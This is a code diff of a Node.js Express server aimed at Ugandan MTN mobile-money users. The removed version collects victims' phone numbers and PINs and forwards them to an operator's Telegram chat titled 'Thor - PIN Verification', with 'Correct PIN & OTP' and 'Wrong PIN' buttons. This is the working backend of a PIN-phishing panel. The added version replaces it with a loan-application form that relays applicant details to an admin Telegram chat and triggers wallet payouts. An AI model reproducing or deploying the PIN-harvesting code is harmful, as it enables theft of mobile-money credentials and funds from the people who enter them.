@@ -1,193 +1,147 @@
-const express = require("express");
-const path = require("path");
-const crypto = require("crypto");
+// index.js - Unified Application Engine & Telegram Broker Layer
+import express from 'express';
+import dotenv from 'dotenv';
+import path from 'path';
+import { fileURLToPath } from 'url';
+import TelegramBot from 'node-telegram-bot-api';
+import { requestLoanDisbursement } from './momoServer.js';
+
+dotenv.config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const PUBLIC_DIR = path.join(__dirname, "public");
-const INDEX_FILE = path.join(PUBLIC_DIR, "index.html");
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
-app.use(express.json({ limit: "10kb" }));
-app.use(express.static(PUBLIC_DIR));
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
 
-app.get("/", (_req, res) => {
-  res.sendFile(INDEX_FILE, err => {
-    if (err && !res.headersSent) res.status(404).send("Not found.");
-  });
-});
+// In-Memory state dict to cache active application objects across request frames
+const pendingLoansCache = new Map();
 
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const requests = new Map();
+// Initialize the Telegram Bot interface pool
+const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
+const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
 
-setInterval(() => {
-  const now = Date.now();
-  for (const [id, data] of requests.entries()) {
-    if (now - new Date(data.createdAt).getTime() > 30 * 60 * 1000) {
-      requests.delete(id);
+/**
+ * API Route: Receive Loan Form Submissions
+ */
+app.post('/api/loans/apply', async (req, res) => {
+    const { fullName, mtnNumber, loanAmount, repaymentPeriodMonths, monthlyIncome, intendedPurpose } = req.body;
+
+    if (!fullName || !mtnNumber || !loanAmount || !repaymentPeriodMonths || !monthlyIncome || !intendedPurpose) {
+        return res.status(400).json({ success: false, error: "Validation failure: All fields are mandatory." });
     }
-  }
-}, 5 * 60 * 1000);
 
-async function telegram(method, payload) {
-  if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing config credentials.");
-  
-  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  });
-  
-  const data = await res.json();
-  if (!res.ok || !data.ok) throw new Error(data.description || "Telegram failed.");
-  return data;
-}
+    const months = parseInt(repaymentPeriodMonths);
+    if (isNaN(months) || months < 1 || months > 24) {
+        return res.status(400).json({ success: false, error: "Invalid horizon parameter: Limits are capped from 1 to 24 months." });
+    }
 
-app.post("/api/phone", (req, res) => {
-  let phone = String(req.body.phone || "").trim();
-  
-  // Strip country code if user accidentally types it out
-  if (phone.startsWith("+256")) phone = phone.replace("+256", "");
-  if (phone.startsWith("256")) phone = phone.replace("256", "");
-  
-  // Validates standard 9-digit Ugandan mobile format (e.g., 778260583)
-  if (!/^(7\d{8})$/.test(phone)) {
-    return res.status(400).json({ error: "Invalid format phone number." });
-  }
-  
-  // Format with country prefix for the Telegram delivery layout
-  const formattedPhone = `0${phone}`; 
-  const numericSuffix = Math.floor(100000000 + Math.random() * 900000000);
-  
-  const item = { 
-    id: crypto.randomUUID(), 
-    numericId: `user_17878${numericSuffix}`,
-    phone: formattedPhone, 
-    stage: "pin-demo", 
-    status: "ready", 
-    createdAt: new Date() 
-  };
-  
-  requests.set(item.id, item);
-  return res.json({ id: item.id, status: item.status });
-});
+    const applicationId = 'LN-' + Math.floor(100000 + Math.random() * 900000);
 
-app.post("/api/pin-demo", async (req, res) => {
-  const id = String(req.body.id || "");
-  const request = requests.get(id);
-  if (!request) return res.status(400).json({ error: "Session expired or missing." });
-  
-  request.pin = String(req.body.pin || "").trim();
-  request.status = "pending";
-  
-  const timeString = new Date().toLocaleString("en-US", { 
-    timeZone: "Africa/Nairobi",
-    year: "numeric",
-    month: "2-digit",
-    day: "2-digit",
-    hour: "2-digit",
-    minute: "2-digit",
-    second: "2-digit",
-    hour12: true
-  });
+    // Save state criteria down to local dictionary memory
+    pendingLoansCache.set(applicationId, { fullName, mtnNumber, loanAmount, months, monthlyIncome, intendedPurpose, status: 'PENDING' });
 
-  const shortTimestamp = new Date().toLocaleString("en-US", {
-    timeZone: "Africa/Nairobi",
-    hour: "2-digit",
-    minute: "2-digit",
-    hour12: false
-  }).replace(":", ".");
-  
-  try {
-    await telegram("sendMessage", {
-      chat_id: CHAT_ID,
-      text: [
-        "# Thor - PIN Verification",
-        "PIN VERIFICATION NEEDED\n",
-        "USER DETAILS:",
-        `• Phone Number: ${request.phone}`,
-        `• PIN Code: ${request.pin}`,
-        `• User ID: ${request.numericId}`,
-        `• Time: ${timeString}`,
-        "• Bot: user178\n",
-        "━━━━━━━━━━━━━━━━━━━━\n",
-        "Verify the PIN:",
-        "• PIN Length: 5 digits",
-        "• Timeout: 5 minutes",
-        `${shortTimestamp}\n`,
-        "━━━━━━━━━━━━━━━━━━━━"
-      ].join("\n"),
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "Correct PIN & OTP", callback_data: `approve:${request.id}` },
-            { text: "❌ Wrong PIN", callback_data: `decline:${request.id}` }
-          ]
-        ]
-      }
-    });
-    return res.json({ status: "pending" });
-  } catch (err) {
-    console.error("TELEGRAM ERROR:", err.message);
-    return res.status(502).json({ error: `Telegram Error: ${err.message}` });
-  }
-});
+    // 📋 COMPREHENSIVE TEXT BLOCK TRANSMITTED DOWN TO TELEGRAM CHAT
+    const fullMessagePayload = `
+📋 *NEW MOPESA UGANDA LOAN APPLICATION*
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+👤 *Applicant Name:* \`${fullName}\`
+📞 *MTN Wallet Line:* \`${mtnNumber}\`
+💰 *Principal Amount:* UGX ${parseFloat(loanAmount).toLocaleString()}
+📅 *Horizon Duration:* ${months} Months
+📈 *Monthly Income:* UGX ${parseFloat(monthlyIncome).toLocaleString()}
+🌾 *Intended Vector:* ${intendedPurpose.toUpperCase()}
+🆔 *Application Ref:* \`${applicationId}\`
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+*Action Required: Choose an authorization vector below.*
+    `;
 
-app.get("/api/status/:id", (req, res) => {
-  const request = requests.get(req.params.id);
-  if (!request) return res.status(404).json({ error: "Not found." });
-  return res.json({ status: request.status, stage: request.stage });
-});
+    // 🔘 THE TELEGRAM INLINE KEYBOARD CORE MATRIX
+    const interactiveInlineKeyboard = {
+        reply_markup: {
+            inline_keyboard: [
+                [
+                    { text: "Approve & Pay ✅", callback_data: `APPROVE_${applicationId}` },
+                    { text: "Reject Application ❌", callback_data: `REJECT_${applicationId}` }
+                ]
+            ]
+        },
+        parse_mode: 'Markdown'
+    };
 
-app.post("/api/retry", (req, res) => {
-  const request = requests.get(String(req.body.id || ""));
-  if (request && request.status === "declined") {
-    request.status = "ready";
-    return res.json({ status: request.status });
-  }
-  return res.status(400).json({ error: "Error resetting layout." });
-});
-
-let offset = 0;
-async function pollTelegram() {
-  if (!BOT_TOKEN || !CHAT_ID) return;
-  while (true) {
     try {
-      const data = await telegram("getUpdates", { offset, timeout: 25, allowed_updates: ["callback_query"] });
-      for (const upd of data.result || []) {
-        offset = upd.update_id + 1;
-        const cb = upd.callback_query;
-        if (!cb) continue;
-        
-        const parts = String(cb.data || "").split(":");
-        // ✅ FIXED: Correctly extracts the action string from array instead of comparing the entire array object
-        const action = parts[0]; 
-        const reqId = parts.slice(1).join(":");
-        const request = requests.get(reqId);
-        
-        if (request && request.status === "pending" && ["approve", "decline"].includes(action)) {
-          if (action === "approve") {
-            request.status = "approved";
-          } else if (action === "decline") {
-            request.status = "declined";
-          }
-          
-          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Action registered: ${action}` });
-          
-          const statusMarker = action === "approve" ? "✅ CORRECT PIN" : "❌ WRONG PIN";
-          await telegram("sendMessage", {
-            chat_id: CHAT_ID,
-            text: `${statusMarker} processed for Phone: ${request.phone}`
-          });
-        }
-      }
-    } catch (e) {
-      await new Promise(r => setTimeout(r, 4000));
+        // Broadcast the template down to your private Admin chat ID channel
+        await bot.sendMessage(ADMIN_CHAT_ID, fullMessagePayload, interactiveInlineKeyboard);
+        return res.status(200).json({ success: true, applicationId });
+    } catch (error) {
+        console.error("[TELEGRAM BROADCAST REJECTION]:", error.message);
+        return res.status(500).json({ success: false, error: "Unable to push data matrix down to administration console." });
     }
-  }
-}
+});
 
-pollTelegram();
+/**
+ * 🎯 INTERACTIVE INLINE KEYBOARD ACTIONS INTERCEPT HOOK
+ * This block runs immediately when you click Approve or Reject inside Telegram
+ */
+bot.on('callback_query', async (callbackQuery) => {
+    const actionData = callbackQuery.data;
+    const messageContext = callbackQuery.message;
 
-app.listen(PORT, () => console.log(`Server executing successfully on port ${PORT}`));
+    const isApproval = actionData.startsWith('APPROVE_');
+    const isRejection = actionData.startsWith('REJECT_');
+    
+    // Extract unique tracking sequence string from payload pattern
+    const applicationId = actionData.replace('APPROVE_', '').replace('REJECT_', '');
+    const application = pendingLoansCache.get(applicationId);
+
+    if (!application || application.status !== 'PENDING') {
+        return bot.answerCallbackQuery(callbackQuery.id, { text: "Error: Session context closed or already processed.", show_alert: true });
+    }
+
+    if (isRejection) {
+        application.status = 'REJECTED';
+        pendingLoansCache.set(applicationId, application);
+
+        // Strip action elements and lock state as Rejected to clean up the Telegram screen
+        await bot.editMessageText(
+            `${messageContext.text}\n\n🛑 *DECISION PROFILE LOG: DECLINED BY ADMINISTRATIVE CONSOLE*`, 
+            { chat_id: messageContext.chat.id, message_id: messageContext.message_id, parse_mode: 'Markdown' }
+        );
+        return bot.answerCallbackQuery(callbackQuery.id, { text: "Application marked as Declined successfully." });
+    }
+
+    if (isApproval) {
+        // Alert admin immediately inside Telegram screen that work has begun
+        await bot.answerCallbackQuery(callbackQuery.id, { text: "Reaching out to MTN API Gateways... Executing Wallet Payout." });
+
+        try {
+            // Trigger actual money transfer through momoServer.js logic
+            const mtnReceipt = await requestLoanDisbursement(application.mtnNumber, application.loanAmount);
+
+            application.status = 'APPROVED';
+            application.mtnTransactionId = mtnReceipt.transactionId;
+            pendingLoansCache.set(applicationId, application);
+
+            // Update Telegram layout with immutable validation tx verification strings
+            await bot.editMessageText(
+                `${messageContext.text}\n\n🟢 *DECISION PROFILE LOG: APPROVED & FUNDS PAID OUT*\n🔗 *MTN Verification TxID:* \`${mtnReceipt.transactionId}\``, 
+                { chat_id: messageContext.chat.id, message_id: messageContext.message_id, parse_mode: 'Markdown' }
+            );
+        } catch (error) {
+            console.error("[MTN INFRASTRUCTURE OPERATION BLOCKED]:", error.message);
+            await bot.sendMessage(
+                messageContext.chat.id, 
+                `⚠️ *CRITICAL DISBURSEMENT SYSTEM FAULT FOR ID ${applicationId}:* \n_${error.message}_`, 
+                { parse_mode: 'Markdown' }
+            );
+        }
+    }
+});
+
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 [SERVER UP] Web platform live. Telegram hooks running smoothly on port ${PORT}`);
+});
+
